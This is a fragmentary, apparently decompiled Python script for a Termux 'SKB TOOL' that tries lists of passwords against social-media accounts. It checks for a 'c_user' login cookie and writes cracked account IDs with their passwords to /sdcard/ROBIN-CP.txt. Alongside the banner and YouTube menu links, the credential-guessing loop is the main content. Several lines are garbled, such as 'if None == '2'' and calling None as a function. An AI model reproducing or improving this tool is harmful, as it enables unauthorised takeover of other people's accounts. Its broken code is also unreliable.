...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://youtube.com/@learningtermux')
        FD()
        return None
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://youtu.be/channel/@skbteamofficial54')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    if None == '2':
        ...
        return None
    if None == '3':
        os.system('xdg-open https://youtube.com/channel/@learningtermux')
        return None
    if None == '4':
...
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mALAMIN\33[0;m\033[1;32m && \033[1;33mKASHIF\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Md. Alamin Islam
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m ALAMIN-XD89
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35m Silent Killer Boys Team
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m================= \33[32;45mAlamin\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO SKB TOOL\33[0;m
 
\033[1;37m================== \33[32;45mSUMONA\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(ROBIN-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ROBIN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[ALAMIN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
